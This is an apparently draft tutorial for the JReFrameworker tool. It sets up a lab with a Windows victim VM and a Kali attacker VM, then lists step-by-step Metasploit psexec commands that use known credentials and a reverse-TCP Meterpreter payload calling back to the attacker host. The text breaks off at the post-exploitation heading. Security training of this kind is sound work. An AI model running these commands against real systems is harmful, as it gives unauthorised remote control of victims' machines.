---
layout: post
title: Payload Deployment
draft: true
---

This tutorial demonstrates how to modify a victim machine's runtime using a JReFrameworker module.

If you haven't already, you should complete the first two tutorials ([Hello World](./hello-world) and [Hidden File](./hidden-file)) to become familiar with the basics of JReFrameworker.

<a name="Setup"></a>

## Lab Setup

You will also need to setup a small laboratory test environment that includes the following.

1. A victim machine (this tutorial uses a fresh install of Windows 7 SP1 x64 English edition in a virtual machine, but any OS capable of running Java will work).
2. An attacker machine with [Metasploit](https://www.metasploit.com/) installed (this tutorial uses a [Kali Linux virtual machine](https://www.offensive-security.com/kali-linux-vmware-virtualbox-image-download/) version 2016.2).
3. An installation of JReFrameworker (this tutorial uses the host machine, but any OS that can run [Eclipse](https://eclipse.org/) with JReFrameworker installed will work).

For this tutorial we will be using [VMWare](https://www.vmware.com) virtual machines, but [Virtualbox](https://www.virtualbox.org) is a good free alternative to VMWare.

Our victim machine was created with an Administrator account named `Victim` and password `badpass`. Log into the machine. Since Java is not installed by default, we will need to install the runtime environment. You can download the standard edition of Java directly from [Oracle](http://www.oracle.com/technetwork/java/javase/downloads/index.html) or by using the [ninite.com](https://ninite.com/) installer. 

After installing Java, we set out virtual machines to `Host only` mode with our victim at `192.168.115.129` and our attacker at `192.168.115.128`. Double check that you know the IP addresses of each machine and that each machine can ping the other. If Kali cannot ping the Windows virtual machine, you may need to disable or specifically allow connections through the Windows firewall.

<p>
  <center>
    <a href="../images/payload-deployment/windows-network-zoom.png" data-lightbox="windows-network" data-title="Windows Network">
      <img src="../images/payload-deployment/windows-network.png" alt="Windows Network" />
      <figcaption>Windows (Victim) Network (click to zoom)</figcaption>
    </a>
  </center>
</p>

<p>
  <center>
    <a href="../images/payload-deployment/kali-network-zoom.png" data-lightbox="kali-network" data-title="Kali Network">
      <img src="../images/payload-deployment/kali-network.png" alt="Kali Network" />
      <figcaption>Kali (Attacker) Network (click to zoom)</figcaption>
    </a>
  </center>
</p>

The next section continues the lab setup towards getting an active [Metasploit Meterpreter](https://www.offensive-security.com/metasploit-unleashed/about-meterpreter/) session on the victim machine. If your lab setup is different and you have a working exploit already, skip to the [Post Exploitation](#PostExploitation) section below.

<a name="Exploitation"></a>

## Exploitation

Since we already know the credentials for the victim machine, we will be using Metasploit's [psexec (pass the hash) module](https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/). In Kali, open the Metasploit framework console by typing `msfconsole` in the terminal. 

Within the Metasploit framework console, load the psexec exploit module by typing `use exploit/windows/smb/psexec`.

Type `show options` to view the exploit configuration parameters.

Set the remote host to be the IP address of the victim machine by typing `set RHOST 192.168.115.129`.

Set the username to authenticate as by typing `set SMBUser Victim`. Note that you may need to replace `Victim` with the Windows username you used to configure your virtual machine with during setup.

Set the password to authenticate with by typing `set SMBPass badpass`. Again you may need to replace `badpass` with the actual password you used during setup.

Finally let's configure a reverse TCP Meterpreter payload that will execute Meterpreter on the victim machine and connect back to our attacker machine with the active session. Configure the payload by typing `set PAYLOAD windows/meterpreter/reverse_tcp`.

Set the outbound Meterpreter connection address to be the local host (the IP address of the attacker machine) by typing `set LHOST 192.168.115.128`.

Set the outbound Meterpreter connection port to be port 443 (https) by typing `set LPORT 443`.

Finally run the exploit by typing `exploit`.

<a name="PostExploitation"></a>

## Post Exploitation